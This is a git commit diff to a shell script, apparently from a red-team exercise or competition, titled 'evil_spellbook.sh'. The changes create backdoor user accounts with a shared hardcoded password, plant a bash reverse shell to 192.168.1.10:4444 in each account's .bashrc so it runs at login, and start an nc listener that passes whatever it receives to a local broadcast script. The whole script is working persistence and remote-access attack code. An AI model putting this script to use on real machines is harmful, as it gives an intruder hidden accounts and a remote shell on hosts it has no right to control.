b6eee5e5d02908ac20231a8ca4a7b5e94842e215
Caroline Richards <caroline.piper.richards@gmail.com>
2026-03-16 15:21:55 -0400

    Fix IP

--- Linux/Chronosfear/evil_spellbook.sh
+++ Linux/Chronosfear/evil_spellbook.sh
@@ -4,12 +4,15 @@ usernames=("caroline" "denna" "kvothe" "bast" "auri" "ambrose" "elodin" "fela")
 
 for username in "${usernames[@]}"; do
     # Create red team users
-    useradd "$username"
+    id "$username" &>/dev/null || useradd -m "$username"
     # Set passwords for red team users
     echo "$username:aTerg0Lupi!" | chpasswd
     # Spawn reverse shell in each user's bash profile
-    echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" >> "/home/$username/.bash_profile"
-    nc -lvnp 5555 | while read line; do
+    echo "bash -i >& /dev/tcp/192.168.1.10/4444 0>&1 &" >> "/home/$username/.bashrc"
+    chown "$username:$username" "/home/$username/.bashrc"
+done
+
+# Listen for messages and display them in terminals
+nc -lvnp 5555 | while read line; do
         /etc/System-Clock/chronos-broadcast.sh "$line"
-    done
 done
